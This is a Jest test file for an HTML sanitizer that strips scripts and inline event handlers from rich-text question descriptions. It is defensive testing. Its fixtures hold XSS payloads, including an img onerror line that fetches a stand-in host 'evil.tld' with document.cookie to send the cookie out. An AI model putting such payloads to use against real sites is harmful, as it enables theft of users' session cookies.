const { sanitizeRichText, sanitizeQuestionStructure } = require('../services/html-sanitizer');

describe('sanitizeRichText', () => {
    it('strips <script> tags', () => {
        const dirty = '<p>Hello</p><script>alert(document.cookie)</script>';
        const clean = sanitizeRichText(dirty);
        expect(clean).not.toMatch(/<script/i);
        expect(clean).toContain('<p>Hello</p>');
    });

    it('strips inline event-handler attributes (H-04/N-XSS-1 exploit pattern)', () => {
        const dirty = '<img src=x onerror="fetch(\'https://evil.tld/?c=\'+document.cookie)">';
        const clean = sanitizeRichText(dirty);
        expect(clean).not.toMatch(/onerror/i);
    });

    it('preserves ordinary TinyMCE formatting tags', () => {
        const dirty = '<p>Please read the <strong>safety brief</strong> before answering.</p><ul><li>Item</li></ul>';
        const clean = sanitizeRichText(dirty);
        expect(clean).toContain('<strong>safety brief</strong>');
        expect(clean).toContain('<li>Item</li>');
    });

    it('passes through null/undefined unchanged', () => {
        expect(sanitizeRichText(null)).toBeNull();
        expect(sanitizeRichText(undefined)).toBeUndefined();
    });

    it('treats an empty string as empty', () => {
        expect(sanitizeRichText('')).toBe('');
    });
});

describe('sanitizeQuestionStructure', () => {
    it('sanitizes the description field of every question, leaving other fields untouched', () => {
        const structure = [
            { id: 'q1', type: 'text_multi', description: '<p>Fine</p>', required: true },
            { id: 'q2', type: 'radio', description: '<img src=x onerror="alert(1)">', options: ['A', 'B'] },
        ];
        const result = sanitizeQuestionStructure(structure);
        expect(result[0].description).toBe('<p>Fine</p>');
        expect(result[1].description).not.toMatch(/onerror/i);
        expect(result[1].options).toEqual(['A', 'B']);
        expect(result[0].required).toBe(true);
    });

    it('does not mutate the input array', () => {
        const structure = [{ id: 'q1', description: '<p>x</p>' }];
        const result = sanitizeQuestionStructure(structure);
        expect(result).not.toBe(structure);
        expect(result[0]).not.toBe(structure[0]);
    });

    it('returns non-array input unchanged', () => {
        expect(sanitizeQuestionStructure(null)).toBeNull();
        expect(sanitizeQuestionStructure(undefined)).toBeUndefined();
    });

    it('leaves questions without a description field untouched', () => {
        const structure = [{ id: 'q1', type: 'boolean' }];
        const result = sanitizeQuestionStructure(structure);
        expect(result[0]).toEqual({ id: 'q1', type: 'boolean' });
    });
});
